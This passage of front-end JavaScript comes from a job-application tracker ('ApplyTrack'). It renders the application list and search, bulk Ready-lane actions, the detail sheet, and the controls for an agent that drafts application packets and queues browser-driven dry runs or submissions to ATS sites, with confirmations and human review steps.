    <div class="pipe-health" role="group" aria-label="Agent status">${health.join(" ")}</div>
    <h2 class="mt-4">Submit queue: (${queue.length})</h2>
    <p class="field-help">In the order the worker will take them. It claims one every 15 seconds and runs the browser on it.</p>
    ${queue.length ? `
    <div class="table-scroll">
      <table class="pipeline-table">
        <caption class="sr-only">Queued submit requests, oldest first</caption>
        <thead><tr><th scope="col">#</th><th scope="col">Application</th><th scope="col">Requested</th><th scope="col">State</th><th scope="col">When drained</th></tr></thead>
        <tbody>${queueRows}</tbody>
      </table>
    </div>` : `<p class="empty-result">Nothing is queued. Queue a packet from the Ready lane, or from an application's Submit button.</p>`}
    ${data.dry_run ? `<div class="mt-3"><button type="button" id="pipeline-open-agent" class="btn btn-ghost">Open Settings · Agent</button></div>` : ""}`;

  body.querySelectorAll("[data-open]").forEach((b) => b.addEventListener("click", () => openApp(b.dataset.open)));
  const agentBtn = document.getElementById("pipeline-open-agent");
  if (agentBtn) agentBtn.addEventListener("click", () => openSettings("agent"));
}

// ---- Sidebar --------------------------------------------------------------

// A search looks everywhere (#322): "which page is DTCC on?" had no answer, because DTCC was
// stuck under Errors and the box only searched the list on screen. The filters narrow a list
// you are browsing; a search finds the one you are looking for, whatever list it is in.
const searching = () => state.query.trim().length > 0;

// An application's number (#326): its row id, shown as #15339 and found by typing 15339 or
// #15339 — something to quote and look up, the way a posting has an ID.
const appId = (a) => (a && a.id ? `#${a.id}` : "");
const idMatches = (a, q) => /^#?\d+$/.test(q) && String(a.id || "") === q.replace(/^#/, "");

function filteredApps({ everywhere = searching() } = {}) {
  const q = state.query.trim().toLowerCase();
  const errored = state.filterStatus === "ready" ? errorNames() : null;
  const apps = state.apps.filter((a) => {
    if (!everywhere) {
      if (state.filterLane && a.lane !== state.filterLane) return false;
      if (state.filterStatus && a.status !== state.filterStatus) return false;
      // An errored application has its own view; Ready lists the ones still to try (#284).
      if (errored && errored.has(a.filename)) return false;
    }
    if (!q) return true;
    return (
      idMatches(a, q) ||
      a.company.toLowerCase().includes(q) ||
      a.role.toLowerCase().includes(q) ||
      a.filename.toLowerCase().includes(q) ||
      (a.snippet || "").toLowerCase().includes(q)
    );
  });
  return apps.sort(compareApps);
}

// First still-open role (not applied, not passed) — where Pass jumps next. Follows
// the chosen sort, so "next up" means next in the order actually on screen.
function nextActionable(excludeName) {
  const app = filteredApps({ everywhere: false }).find(
    (a) => a.filename !== excludeName && statusGroup(a.status) === 0);
  return app ? app.filename : null;
}

// The Ready lane is the one place work is done in bulk: prepare / submit / pass the
// ticked packets, or submit every one whose last dry run was clean, in one request.
const bulkBarEl = $("#bulk-bar");
// Not while searching: a search lists every status, and bulk actions are Ready's alone.
const bulkMode = () => state.filterStatus === "ready" && !searching();

function renderBulkBar(visible) {
  if (!bulkBarEl) return;
  if (!bulkMode()) {
    bulkBarEl.hidden = true;
    bulkBarEl.innerHTML = "";
    return;
  }
  // Selection only ever names rows on screen.
  const shown = new Set(visible.map((a) => a.filename));
  [...state.selected].forEach((n) => { if (!shown.has(n)) state.selected.delete(n); });
  const n = state.selected.size;
  const canQueue = state.browserAvailable && state.agentEnabled;
  bulkBarEl.hidden = false;
  bulkBarEl.innerHTML = `
    <span class="bulk-count" aria-live="polite">${n} selected</span>
    <button class="btn btn-ghost btn-xs" type="button" data-bulk="all">Select all</button>
    <button class="btn btn-ghost btn-xs" type="button" data-bulk="none"${n ? "" : " disabled"}>Clear</button>
    ${canQueue ? `<button class="btn btn-ghost btn-xs" type="button" data-bulk="prepare"${n ? "" : " disabled"}>Prepare selected</button>` : ""}
    ${canQueue ? `<button class="btn btn-primary btn-xs" type="button" data-bulk="submit"${n ? "" : " disabled"}>Submit selected</button>` : ""}
    <button class="btn btn-ghost btn-xs" type="button" data-bulk="pass"${n ? "" : " disabled"}>Pass selected</button>
    ${canQueue ? `<button class="btn btn-ghost btn-xs" type="button" data-bulk="submit-clean">Submit all clean</button>` : ""}`;
  bulkBarEl.querySelectorAll("[data-bulk]").forEach((b) => {
    b.onclick = () => {
      const act = b.dataset.bulk;
      if (act === "all") { visible.forEach((a) => state.selected.add(a.filename)); renderSidebar(); }
      else if (act === "none") { state.selected.clear(); renderSidebar(); }
      else runBulk(act);
    };
  });
}

async function runBulk(act) {
  const names = [...state.selected];
  const body = act === "submit-clean"
    ? { action: "submit", all_clean: true }
    : { action: act, names };
  const count = act === "submit-clean" ? "every clean" : String(names.length);
  const verbs = {
    prepare: ["Prepare", "rebuild the packet and fill the form for"],
    submit: ["Submit", "queue the browser to apply for"],
    "submit-clean": ["Submit all clean", "queue a real submission for every Ready packet whose last dry run was clean —"],
    pass: ["Pass", "mark passed"],
  };
  const [label, verb] = verbs[act];
  if (act !== "prepare" && !await confirmAction({
    title: `${label}?`,
    message: `This will ${verb} ${count} application${count === "1" ? "" : "s"}.`,
    confirmLabel: label,
  }))
    return;
  try {
    const r = await api("POST", "/api/ready/actions", body);
    const done = (r.done || []).length;
    const skipped = r.skipped || [];
    const what = act === "pass" ? "passed" : r.dry_run ? "queued for a dry run" : act === "prepare" ? "queued to prepare" : "queued to submit";
    toast(`${done} ${what}${skipped.length ? ` · ${skipped.length} skipped: ${skipped.slice(0, 3).map((s) => `${stem(s.name)} (${s.reason})`).join("; ")}${skipped.length > 3 ? "…" : ""}` : "."}`);
    announce(`${done} ${what}, ${skipped.length} skipped.`);
    state.selected.clear();
    await refresh();
    renderSidebar();
  } catch (e) {
    toast(e.message);
  }
}

function renderSidebar() {
  const apps = filteredApps();
  const stuck = errorNames();
  listEl.innerHTML = "";
  if (apps.length === 0) {
    listEl.innerHTML = searching()
      ? `<li class="empty-result">No application matches “${escapeHtml(state.query.trim())}”.</li>`
      : `<li class="empty-result">No applications match the current filters.</li>`;
  }
  renderBulkBar(apps);
  apps.forEach((a, i) => {
    const li = document.createElement("li");
    li.className = "application-list-item";
    li.dataset.name = a.filename;
    const select = bulkMode()
      ? `<label class="card-select"><input type="checkbox" data-select="${escapeHtml(a.filename)}"${state.selected.has(a.filename) ? " checked" : ""}
           aria-label="Select ${escapeHtml(a.company)}${a.role ? ` · ${escapeHtml(a.role)}` : ""}" /></label>`
      : "";
    if (select) li.classList.add("selectable");
    const score = a.score ? `<span class="score-chip">fit ${escapeHtml(a.score)}</span>` : "";
    // The fit chip and the company name make those two orderings self-evident; the
    // posted date is only worth the space when it's what the list is ordered by.
    const posted = state.sort === "created" && a.created
      ? `<span>Posted ${escapeHtml(a.created)}</span>` : "";
    const contactLine =
      a.contact || a.contact_email
        ? `<span class="ic-meta">Contact: ${escapeHtml(a.contact || a.contact_email)}${
            a.contact && a.contact_email ? " · " + escapeHtml(a.contact_email) : ""
          }</span>`
        : "";
    const selected = a.filename === state.current;
    const initials = (a.company || "?")
      .split(/\s+/).filter(Boolean).slice(0, 2).map((part) => part[0]).join("").toUpperCase();
    li.innerHTML = `${select}<button type="button" class="application-card" aria-current="${selected}" data-name="${escapeHtml(a.filename)}">
      <span class="company-mark" aria-hidden="true">${escapeHtml(initials)}</span>
      <span class="application-card-body">
        <span class="application-card-header">
          <span class="ic-title">${escapeHtml(a.company)}</span>
          ${statusBadge(a.status)}${stuck.has(a.filename) ? ` <span class="badge" data-status="rejected">In Errors</span>` : ""}
        </span>
        ${a.role ? `<span class="ic-role">${escapeHtml(a.role)}</span>` : ""}
        <span class="ic-meta">${a.id ? `<span class="mono">${escapeHtml(appId(a))}</span>` : ""} ${lanePill(a.lane)} ${score} ${posted}
          ${a.applied ? `<span>Applied ${escapeHtml(a.applied)}</span>` : ""}
          ${a.followup ? `<span>Follow-up ${escapeHtml(a.followup)}</span>` : ""}</span>
        ${contactLine}
      </span>
      <span class="card-chevron" aria-hidden="true">›</span>
      </button>`;
    li.querySelector("button").addEventListener("click", () => openApp(a.filename));
    const box = li.querySelector("[data-select]");
    if (box) box.addEventListener("change", () => {
      if (box.checked) state.selected.add(a.filename); else state.selected.delete(a.filename);
      renderBulkBar(apps);
    });
    listEl.appendChild(li);
  });
  const total = state.apps.length;
  const shown = apps.length;
  countEl.textContent = searching()
    ? `${shown} match${shown === 1 ? "" : "es"} in all ${total} applications`
    : shown === total
      ? `${total} application${total === 1 ? "" : "s"}`
      : `${shown} of ${total} applications`;
  if (state.mode === "status") {
    if (state.filterStatus) renderStatusView();
    else renderEmpty();
  }
  // A refresh that changed the list changes the results too.
  else if (state.mode === "search" && searching() && !contentEl.contains(document.activeElement)) renderSearchView();
}

// ---- Main pane ------------------------------------------------------------

function renderEmpty() {
  state.mode = "empty";
  syncPipelineButton();
  state.current = null;
  showListPane({ restoreFocus: false });
  document.title = "Applications | ApplyTrack";
  renderSidebar();
  contentEl.innerHTML = `
    <div class="empty">
      <div class="empty-illustration" aria-hidden="true">
        <svg viewBox="0 0 80 80" focusable="false">
          <rect x="18" y="13" width="44" height="54" rx="8" />
          <path d="M29 29h22M29 40h15M29 51h19" />
          <circle cx="59" cy="58" r="12" />
          <path d="m54 58 3 3 7-8" />
        </svg>
      </div>
      <h2 class="empty-title">No application selected</h2>
      <p>Choose an opportunity from the list to review your research and next action.</p>
    </div>`;
}

async function openApp(name) {
  try {
    const data = await api("GET", `/api/apps/${encodeURIComponent(name)}`);
    state.current = name;
    state.currentVersion = data.version || "";
    state.mode = "view";
    syncPipelineButton();
    renderSidebar();
    renderView(data);
    showDetailPane();
    document.title = `${data.fields.company || stem(name)} | ApplyTrack`;
    focusView("h2");
  } catch (e) {
    toast(e.message);
  }
}

function metaRow(f) {
  const parts = [];
  const item = (label, value, extra = "") =>
    `<div class="meta-item ${extra}"><dt>${label}</dt><dd>${value}</dd></div>`;
  parts.push(item("Lane", lanePill(f.lane)));
  if (f.score) parts.push(item("Fit score", `<span class="score-value">${escapeHtml(f.score)}<small>/100</small></span>`, "meta-score"));
  if (f.location) parts.push(item("Location", escapeHtml(f.location)));
  if (f.salary) parts.push(item("Compensation", escapeHtml(f.salary)));
  if (f.applied) parts.push(item("Applied", escapeHtml(f.applied)));
  if (f.followup) parts.push(item("Follow-up", escapeHtml(f.followup)));
  if (f.contact) parts.push(item("Contact", escapeHtml(f.contact)));
  if (f.contact_email) parts.push(item("Email", `<a href="mailto:${escapeHtml(f.contact_email)}">${escapeHtml(f.contact_email)}</a>`, "meta-email"));
  if (f.source) parts.push(item("Source", `<span class="mono">${escapeHtml(f.source)}</span>`));
  return `<dl class="meta-grid">${parts.join("")}</dl>`;
}

function renderView(data) {
  const f = data.fields;
  const url = safeUrl(f.link);
  // Already at or past "applied" — APPLIED_STATUSES covers screen/onsite/offer/rejected
  // too, where re-marking would drag the row backwards rather than just repeat a no-op.
  const alreadyApplied = APPLIED_STATUSES.has(f.status);
  const applyBtn =
    url && (f.status === "ready" || f.status === "lead")
      ? `<a class="btn btn-apply" href="${escapeHtml(url)}" target="_blank" rel="noopener">Apply ↗</a>`
      : url
      ? `<a class="btn btn-ghost" href="${escapeHtml(url)}" target="_blank" rel="noopener">Posting ↗</a>`
      : "";
  const checkBtn = f.link
    ? `<button class="btn btn-ghost" data-act="check-link">Investigate link</button>`
    : "";
  contentEl.innerHTML = `
    <article class="sheet">
      <header class="view-header">
        <div class="view-heading">
          <div class="sheet-eyebrow">${statusBadge(f.status)} ${(() => { const id = appId(state.apps.find((a) => a.filename === data.filename)); return id ? `<span class="mono" title="Application number — search for it">${escapeHtml(id)}</span>` : ""; })()} <span class="filename mono">${escapeHtml(data.filename)}</span></div>
          <h2 class="sheet-title">${escapeHtml(f.company || stem(data.filename))}</h2>
          ${f.role ? `<div class="role-title">${escapeHtml(f.role)}</div>` : ""}
        </div>
        <div class="seg" role="tablist" aria-label="Application editor mode">
          <button type="button" role="tab" aria-selected="true" data-act="edit">Form</button>
          <button type="button" role="tab" aria-selected="false" data-act="raw">Raw source</button>
        </div>
      </header>
      ${metaRow(f)}
      <div class="action-row detail-links">${applyBtn}${checkBtn}</div>
      <div id="link-status" class="mt-2 text-sm" role="status" aria-live="polite"></div>
      ${verdictSection(data)}
      ${packetSection(data)}
      <section class="detail-section" aria-labelledby="notes-heading">
        <div class="section-heading">
          <span class="section-kicker">Workspace</span>
          <h3 id="notes-heading">Notes &amp; research</h3>
        </div>
        <div class="prose-omi">${renderUntrustedMarkdown(f.notes || "_No notes yet._", { gfm: true, breaks: false })}</div>
      </section>
      ${materialSection(data)}
      <div class="status-actions section-divider">
        <div class="workflow-actions">
          <button class="btn btn-primary" data-act="applied"${alreadyApplied ? ' disabled aria-disabled="true"' : ""}
            title="${alreadyApplied ? `Already ${escapeHtml(f.status)}` : "Mark this application applied"}">Mark applied</button>
          <button class="btn btn-ghost" data-act="pass">Pass</button>
          <button class="btn btn-ghost" data-act="blacklist">Blacklist company</button>
        </div>
        <div class="danger-actions">
          <button class="btn btn-danger" data-act="delete">Delete</button>
        </div>
      </div>
    </article>`;
  contentEl.querySelector('[data-act="edit"]').onclick = () => openEdit(data);
  contentEl.querySelector('[data-act="raw"]').onclick = () => openRaw(data);
  contentEl.querySelector('[data-act="applied"]').onclick = () => {
    if (alreadyApplied) return;
    markStatus(data, "applied");
  };
  contentEl.querySelector('[data-act="pass"]').onclick = () => markStatus(data, "pass");
  contentEl.querySelector('[data-act="blacklist"]').onclick = () => blacklistCompany(data);
  contentEl.querySelector('[data-act="delete"]').onclick = () => deleteApp(data.filename);
  const draftEl = contentEl.querySelector('[data-act="draft"]');
  if (draftEl) draftEl.onclick = () => draftMaterial(data.filename, draftEl);
  const matCopyEl = contentEl.querySelector('[data-act="mat-copy"]');
  if (matCopyEl) matCopyEl.onclick = () => copyText(data.material, "Cover letter copied.");
  const matDownEl = contentEl.querySelector('[data-act="mat-download"]');
  if (matDownEl) matDownEl.onclick = () => downloadMaterial(data);
  const matPdfEl = contentEl.querySelector('[data-act="mat-pdf"]');
  if (matPdfEl) matPdfEl.onclick = () => downloadMaterialPdf(data);
  const matDiscardEl = contentEl.querySelector('[data-act="mat-discard"]');
  if (matDiscardEl) matDiscardEl.onclick = () => discardMaterial(data.filename);
  const checkEl = contentEl.querySelector('[data-act="check-link"]');
  if (checkEl) checkEl.onclick = () => investigateLink(data.filename, checkEl);
  const verdictEl = contentEl.querySelector('[data-act="verdict"]');
  if (verdictEl) verdictEl.onclick = () => evaluateFit(data.filename, verdictEl);
  wirePacket(data);
}

// ---- The packet (Ready-to-submit queue) ---------------------------------------
// Everything the agent prepared for this application: the form the ATS asks, the
// drafted answers (every one editable), and what still needs a human. Submission is
// the human's: "Copy answers and open the posting" works for every ATS.

const PACKET_PROVIDER_LABEL = {
  greenhouse: "Greenhouse", lever: "Lever", ashby: "Ashby", workday: "Workday", successfactors: "SAP SuccessFactors", workable: "Workable",
  breezy: "Breezy", smartrecruiters: "SmartRecruiters", join: "join.com", aggregator: "job aggregator listing",
  unknown: "unknown ATS",
};
// The ATSs the browser drives without the long-tail opt-in (mirrors AtsProvider.BrowserCanSubmit).
const BROWSER_PROVIDERS = ["greenhouse", "lever", "ashby", "workable", "breezy", "smartrecruiters", "join"];
// Never driven: Workday and SuccessFactors need a candidate account with the employer; an
// aggregator's listing has no form on it.
const MANUAL_PROVIDERS = ["workday", "successfactors", "aggregator"];

function packetSection(data) {
  const p = data.packet;
  const v = data.agent_verdict && data.agent_verdict.detail;
  if (!p) {
    if (!state.agentEnabled) return "";
    return `
      <section class="material-block" aria-labelledby="packet-heading">
        <div class="material-header">
          <div>
            <div class="section-kicker">Agent</div>
            <h3 id="packet-heading">Application packet</h3>
            <p class="field-help">Prepare the answers and the letter; you review and submit.</p>
          </div>
          <button class="btn btn-primary shrink-0" data-act="prepare"${v && v.decision === "skip" ? ' data-force="1"' : ""}>${v && v.decision === "skip" ? "Prepare anyway" : "Prepare packet"}</button>
        </div>
      </section>`;
  }
  const review = p.needs_review || [];
  const byId = Object.fromEntries((p.questions || []).map((q) => [q.id, q]));
  const alert = review.length
    ? `<div class="error-summary" role="alert" tabindex="-1">
         <strong>${review.length} answer${review.length === 1 ? "" : "s"} need${review.length === 1 ? "s" : ""} you before this can be submitted:</strong>
         <ul class="verdict-list">${review.map((r) => `<li><a href="#pq-${escapeHtml(cssId(r.id))}">${escapeHtml((byId[r.id] || {}).label || r.id)}</a> — ${escapeHtml(r.reason)}</li>`).join("")}</ul>
       </div>`
    : `<p class="mt-2"><span class="link-status ok">Ready to submit</span> <span class="text-sm">· every required answer is drafted; review them, then apply.</span></p>`;
  const rows = (p.questions || []).map((q) => packetQuestionRow(q, p.answers || {}, review)).join("");
  const url = safeUrl(data.fields.link);
  // The browser drives Greenhouse, Lever and Ashby; the long tail only when opted in;
  // Workday never — applying needs an account with the employer.
  const browserCan = state.browserAvailable && url && (
    BROWSER_PROVIDERS.includes(p.provider)
    || (p.provider === "linkedin_easy" ? state.linkedinEasy : (!MANUAL_PROVIDERS.includes(p.provider) && state.longTail)));
  const manualNote = url && (p.provider === "aggregator" || (state.browserAvailable && !browserCan))
    ? `<p class="field-help mt-2">${p.provider === "workday"
        ? "Workday needs an account with the employer, so this one is yours to submit — copy the answers and open the posting."
        : p.provider === "successfactors"
        ? "SuccessFactors only takes applications from a signed-in candidate account, so this one is yours to submit — copy the answers and open the posting."
        : p.provider === "aggregator"
        ? "This link is a job aggregator's listing, not the employer's form, so the agent never runs the browser at it. Open the posting, follow its Apply to the employer, and paste the answers there."
        : "The agent doesn't know this ATS. Turn on the long tail in Settings · Agent to let the browser try, or copy the answers and open the posting."}</p>`
    : "";
  return `
    <section class="material-block" aria-labelledby="packet-heading">
      <div class="material-header">
        <div>
          <div class="section-kicker">Agent · ${escapeHtml(PACKET_PROVIDER_LABEL[p.provider] || p.provider)}</div>
          <h3 id="packet-heading">Application packet</h3>
        </div>
        <div class="material-actions">
          ${url ? `<button class="btn ${browserCan ? "btn-ghost" : "btn-primary"} btn-xs" data-act="copy-open">Copy answers and open the posting</button>` : ""}
          ${browserCan ? `<button class="btn btn-ghost btn-xs" data-act="submit" data-dry="1">Fill in the browser (dry run)</button>` : ""}
          ${browserCan ? `<button class="btn btn-primary btn-xs" data-act="submit" ${review.length ? "disabled aria-disabled=\"true\"" : ""}>Submit application</button>` : ""}
          ${state.agentEnabled ? `<button class="btn btn-ghost btn-xs" data-act="prepare" data-force="1">Rebuild</button>` : ""}
          <button class="btn btn-ghost btn-xs" data-act="packet-discard">Discard</button>
        </div>
      </div>
      ${alert}
      ${manualNote}
      <div id="submit-status" class="mt-2 text-sm" role="status" aria-live="polite"></div>
      <div id="evidence"></div>
      <form id="packet-form" class="mt-3">
        <div id="packet-errors" class="error-summary" role="alert" tabindex="-1" hidden></div>
        ${rows}
        <details class="mt-4">
          <summary class="field-help">The posting text the agent judged (${(p.posting_excerpt || "").length ? "excerpt" : "not available"})</summary>
          <pre class="packet-excerpt">${escapeHtml(p.posting_excerpt || "(the posting text could not be retrieved — the verdict and answers came from the title, notes and your résumé)")}</pre>
        </details>
        <div class="mt-4 flex items-center justify-end gap-2 border-t border-rule pt-4">
          <button class="btn btn-primary" data-act="packet-save" type="submit">Save answers</button>
        </div>
      </form>
    </section>`;
}

const cssId = (id) => String(id).replace(/[^a-zA-Z0-9_-]/g, "_");

function packetQuestionRow(q, answers, review) {
  const id = `pq-${cssId(q.id)}`;
  const value = answers[q.id] || "";
  const flagged = review.find((r) => r.id === q.id);
  const req = q.required ? ' <span aria-hidden="true">*</span>' : "";
  const help = flagged
    ? `<span id="${id}-help" class="field-help packet-flag">${escapeHtml(flagged.reason)}</span>`
    : q.kind === "eeo"
    ? `<span id="${id}-help" class="field-help">Optional demographic question — never guessed. Answer it once here or in Settings · Answers and it goes on every form that offers the same option; blank stays blank.</span>`
    : "";
  let control;
  if (q.type === "file") {
    control = `<div id="${id}" class="field-help mono">${q.id.includes("resume") ? "Your résumé PDF — attached when you apply." : "A file you attach when you apply."}</div>`;
  } else if (q.type === "select" && (q.options || []).length) {
    control = `<select id="${id}" class="field-input" data-q="${escapeHtml(q.id)}" aria-describedby="${id}-help">
        <option value=""${value ? "" : " selected"}>— choose —</option>
        ${q.options.map((o) => `<option value="${escapeHtml(o)}"${o === value ? " selected" : ""}>${escapeHtml(o)}</option>`).join("")}
      </select>`;
  } else if (q.type === "textarea" || value.length > 120) {
    control = `<textarea id="${id}" class="field-input" rows="${Math.min(12, Math.max(3, Math.ceil(value.length / 90)))}" data-q="${escapeHtml(q.id)}" aria-describedby="${id}-help">${escapeHtml(value)}</textarea>`;
  } else {
    const hint = (q.options || []).length ? ` placeholder="${escapeHtml(q.options.join(" / "))}"` : "";
    control = `<input id="${id}" class="field-input" value="${escapeHtml(value)}" data-q="${escapeHtml(q.id)}" aria-describedby="${id}-help"${hint} />`;
  }
  return `
    <div class="mt-3 packet-q${flagged ? " packet-q-flagged" : ""}">
      <label class="field-label" for="${id}">${escapeHtml(q.label || q.id)}${req}</label>
      ${control}
      ${help}
    </div>`;
}

function wirePacket(data) {
  const prepEl = contentEl.querySelector('[data-act="prepare"]');
  if (prepEl) prepEl.onclick = () => preparePacket(data.filename, prepEl, prepEl.dataset.force === "1");
  const form = document.getElementById("packet-form");
  if (form) form.onsubmit = (e) => { e.preventDefault(); savePacket(data); };
  const copyEl = contentEl.querySelector('[data-act="copy-open"]');
  if (copyEl) copyEl.onclick = () => copyAnswersAndOpen(data);
  const discardEl = contentEl.querySelector('[data-act="packet-discard"]');
  if (discardEl) discardEl.onclick = () => discardPacket(data.filename);
  contentEl.querySelectorAll('[data-act="submit"]').forEach((b) => {
    b.onclick = () => queueSubmit(data.filename, b, b.dataset.dry === "1");
  });
  if (data.packet && state.browserAvailable) loadEvidence(data.filename);
}

// Queue a browser run for the worker: a dry run (fill + screenshot, no click) or
// the real thing. The worker picks it up within seconds; the sheet shows the result
// as evidence once it lands, and the moo says so too.
async function queueSubmit(name, btn, dryRun) {
  const label = btn.textContent;
  btn.disabled = true;
  btn.textContent = "Queuing…";
  try {
    const r = await api("POST", `/api/apps/${encodeURIComponent(name)}/submit`, { dry_run: dryRun });
    const out = document.getElementById("submit-status");
    if (out) out.textContent = r.queued
      ? (r.dry_run ? "Queued: the browser will fill the form and screenshot it." : "Queued: the browser will submit the application.")
      : "Already queued — the browser is on it.";
    toast(r.queued ? (r.dry_run ? "Dry run queued." : "Submission queued.") : "Already queued.");
    setTimeout(() => loadEvidence(name), 20000);
  } catch (e) {
    toast(e.message);
  } finally {
    btn.disabled = false;
    btn.textContent = label;
  }
}

// "last run failed at 12:17 PM 9/15/2026 — see what the browser saw": when the run was, in
// the reader's own clock, so a failure can be matched to what they were doing at the time.
function readyHolding(r) {
  if (!r.last_at || !/^last run /.test(r.holding)) return r.holding;
  const at = new Date(r.last_at);
  const when = `${at.toLocaleTimeString([], { hour: "numeric", minute: "2-digit" })} ${at.toLocaleDateString()}`;
  return r.holding.replace(/^(last run [a-z ]+?)( —| waiting)/, `$1 at ${when}$2`);
}

// What the browser saw: screenshots and confirmations, newest first.
async function loadEvidence(name) {
  const out = document.getElementById("evidence");
  if (!out) return;
  let items = [];
  try {
    items = await api("GET", `/api/apps/${encodeURIComponent(name)}/evidence`);
  } catch (_) {
    return;
  }
  if (!Array.isArray(items) || !items.length) { out.innerHTML = ""; return; }
  const KIND = { dry_run: "Filled (dry run)", submitted: "Submitted", failed: "Failed", awaiting_code: "Waiting for your security code",
    deferred: "Waiting — LinkedIn's daily limit" };
  // A dry run either proved the form can be finished unattended or stopped on questions
  // only the person can answer; the label says which, and names them (#190).
  const kindLabel = (e) => {
    if (e.kind === "awaiting_code" && e.detail && e.detail.sign_in) return "Waiting for your sign-in code or link";
    if (e.kind !== "dry_run") return KIND[e.kind] || e.kind;
    const needs = (e.detail && e.detail.needs_you) || [];
    return needs.length ? `Filled (dry run) · ${needs.length} need${needs.length === 1 ? "s" : ""} you` : "Filled (dry run) · clean";
  };
  // The run is parked on the board's security-code prompt: the code it emailed goes here.
  // Or on the board's email sign-in (join.com, #210): then the code OR the whole link from
  // the email does, and the box takes either.
  const parked = items[0].kind === "awaiting_code" ? items[0] : null;
  const signIn = !!(parked && parked.detail && parked.detail.sign_in);
  const recipient = parked && parked.detail && parked.detail.recipient ? ` to ${escapeHtml(parked.detail.recipient)}` : "";
  out.innerHTML = `
    <h4 class="mt-4">What the browser saw</h4>
    ${parked ? `
    <form id="security-code-form" class="packet-flag mt-2" aria-live="polite">
      <label class="field-label" for="security-code">${signIn
        ? `The board signs you in by email before it shows its form: it sent a code or a link${recipient}. Paste the code — or the whole link — here within a few minutes, or reply to the Telegram moo with it:`
        : `The board emailed a security code${recipient}. Paste it here within a few minutes, or reply to the Telegram moo with it:`}</label>
      <div class="flex gap-2 mt-1">
        <input id="security-code" class="field-input mono" autocomplete="one-time-code" inputmode="text" ${signIn ? `maxlength="2048"` : `maxlength="16" pattern="[A-Za-z0-9]{4,16}"`} required />
        <button class="btn btn-primary" type="submit">${signIn ? "Send code or link" : "Send code"}</button>
      </div>
    </form>` : ""}
    <ul class="agent-log">${items.map((e) => `
      <li class="mt-2 text-sm">
        <span class="link-status ${e.kind === "failed" ? "bad" : "ok"}">${escapeHtml(kindLabel(e))}</span>
        <span class="text-ink-faint">· ${escapeHtml(new Date(e.created_at).toLocaleString())}</span>
        ${e.confirmation ? `<div class="field-help mt-1">“${escapeHtml(e.confirmation)}”</div>` : ""}
        ${e.kind === "dry_run" && e.detail && (e.detail.needs_you || []).length
          ? `<ul class="evidence-needs field-help">${e.detail.needs_you.map((q) => `<li>${escapeHtml(q)}</li>`).join("")}</ul>` : ""}
        ${e.detail && e.detail.error ? `<div class="packet-flag mt-1">${escapeHtml(e.detail.error)}</div>` : ""}
        ${e.has_screenshot ? `<details class="mt-1"><summary class="field-help">Screenshot</summary>
          <img class="evidence-shot" alt="Screenshot of the application form as the browser left it" loading="lazy"
            src="/api/apps/${encodeURIComponent(name)}/evidence/${e.id}/screenshot.png" /></details>` : ""}
      </li>`).join("")}
    </ul>`;
  const form = document.getElementById("security-code-form");
  if (form) form.onsubmit = async (ev) => {
    ev.preventDefault();
    const code = document.getElementById("security-code").value.trim();
    try {
      await api("POST", `/api/apps/${encodeURIComponent(name)}/security-code`, { code });
      toast("Code sent — the browser is finishing the submission.");
      setTimeout(() => loadEvidence(name), 15000);
    } catch (e) {
      toast(e.message);
    }
  };
}

function collectPacketAnswers() {
  const answers = {};
  contentEl.querySelectorAll("#packet-form [data-q]").forEach((el) => {
    answers[el.dataset.q] = el.value.trim();
  });
  return answers;
}

// Prepare (or rebuild) the packet: the agent judges the lead, drafts the letter and
// the answers, and parks the application in Ready. A model round-trip, like drafting.
async function preparePacket(name, btn, force) {
  const label = btn.textContent;
  btn.disabled = true;
  btn.textContent = "Preparing… (~1 min)";
  try {
    const r = await api("POST", `/api/apps/${encodeURIComponent(name)}/packet/prepare${force ? "?force=true" : ""}`);
    await refresh();
    await openApp(name);
    // Handed to the worker (the browser is there, not here): the packet lands in a minute
    // or two with the real form discovered, then the dry run and the moo follow.
    if (r && r.pending) {
      const out = document.getElementById("submit-status");
      if (out) out.textContent = r.queued
        ? "Queued: the worker is rebuilding the packet where the browser is, then filling the form."
        : "Already queued — the worker is on it.";
      toast(r.queued ? "Prepare queued — the worker will rebuild the packet and fill the form." : "Already queued.");
      setTimeout(() => { if (state.current === name) openApp(name); }, 45000);
    } else {
      toast("Packet ready — review the answers.");
    }
  } catch (e) {
    btn.disabled = false;
    btn.textContent = label;
    toast(e.message);
  }
}

// Saves through the same expected_version → 409 → overwrite-confirm contract as
// applications, keyed on the packet's own version.
async function savePacket(data) {
  const path = `/api/apps/${encodeURIComponent(data.filename)}/packet`;
  const body = { answers: collectPacketAnswers() };
  const versioned = `${path}?expected_version=${encodeURIComponent(data.packet.version)}`;
  try {
    let saved;
    try {
      saved = await api("PUT", versioned, body);
    } catch (e) {
      if (e.status === 409 && await confirmAction({
        title: "Packet changed",
        message: "The packet changed since you opened it (the agent may have rebuilt it). Overwrite it with your answers?",
        confirmLabel: "Overwrite",
      })) {
        saved = await api("PUT", path, body);
      } else {
        throw e;
      }
    }
    await openApp(data.filename);
    toast(saved.needs_review && saved.needs_review.length
      ? `Saved · ${saved.needs_review.length} still need${saved.needs_review.length === 1 ? "s" : ""} you.`
      : "Saved · ready to submit.");
  } catch (e) {
    toast(e.message);
  }
}

// The universal path: every answer as "Label: answer" on the clipboard, and the
// posting in a new tab. Works for every ATS, no browser automation needed.
async function copyAnswersAndOpen(data) {
  const p = data.packet;
  const answers = collectPacketAnswers();
  const lines = (p.questions || [])
    .filter((q) => q.type !== "file" && (answers[q.id] || "").length)
    .map((q) => `${q.label || q.id}:\n${answers[q.id]}`);
  const url = safeUrl(data.fields.link);
  await copyText(lines.join("\n\n"), "Answers copied — paste them into the form.");
  if (url) window.open(url, "_blank", "noopener");
}

async function discardPacket(name) {
  if (!await confirmAction({
    title: "Discard the packet?",
    message: "The drafted answers are deleted. The application keeps its status; you can prepare again later.",
    confirmLabel: "Discard",
  }))
    return;
  try {
    await api("DELETE", `/api/apps/${encodeURIComponent(name)}/packet`);
    await openApp(name);
    toast("Packet discarded.");
  } catch (e) {
    toast(e.message);
  }
}

// The agent's verdict on this lead — the accountability affordance. A skip shows
// its reason so a veto is visible rather than silent; "Evaluate fit" runs the same
// judgement the unattended worker would, right now, and only renders when the
// tenant has switched the agent on.
function verdictSection(data) {
  const v = data.agent_verdict && data.agent_verdict.detail;
  if (!v && !state.agentEnabled) return "";
  const evalBtn = state.agentEnabled
    ? `<button class="btn ${v ? "btn-ghost btn-xs" : "btn-primary shrink-0"}" data-act="verdict">${v ? "Re-evaluate" : "Evaluate fit"}</button>`
    : "";
  if (!v) {
    return `
      <section class="material-block" aria-labelledby="verdict-heading">
        <div class="material-header">
          <div>
            <div class="section-kicker">Agent</div>
